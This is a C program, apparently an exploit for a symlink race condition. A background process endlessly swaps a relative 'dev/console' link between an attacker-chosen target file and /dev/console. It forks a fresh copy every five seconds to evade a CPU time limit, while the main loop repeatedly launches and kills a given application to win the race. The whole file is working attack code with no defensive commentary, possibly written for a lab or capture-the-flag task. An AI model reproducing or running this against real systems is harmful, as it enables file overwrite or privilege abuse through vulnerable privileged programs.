#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>
#include <signal.h>
#include <stdio.h>
#include <time.h>

#define CPU_TIME_LIMIT      5


void symlink_loop(char *target) {
    remove("dev/console0");
    remove("dev/console");

    time_t last_fork = time(NULL);
    while (1) {
        for (int i = 0; i < 1000; i++) {
            symlink(target, "dev/console0");
            rename("dev/console0", "dev/console");

            symlink("/dev/console", "dev/console0");
            rename("dev/console0", "dev/console");
        }
        
        time_t now = time(NULL);
        if ((now - last_fork) >= (CPU_TIME_LIMIT)) {
            if (fork()) return;
            last_fork = now;
        }
    }
}

int main(int argc, char **args) {
    if (argc != 3) {
        fprintf(stderr, "ERR: Wrong usage\n");
        return 1;
    }

    char *application = args[1];
    char *target = args[2];
    if (!fork()) {
        symlink_loop(target);
        return 0;
    }

    char *child_args[] = {application, "0", "0", "0", "0", NULL};
    
    for (int fork_counter = 0;; fork_counter++) {
        pid_t pid = fork();
        if (pid < 0) {
            fprintf(stderr, "ERR: fork failed: %d\n", fork_counter);
            return 1;
        }

        if (!pid) {
            execv(application, child_args);
            return 1;
        }

        usleep(100);
        kill(pid, SIGTERM);
        waitpid(pid, NULL, 0);
    }

    return 0;
}
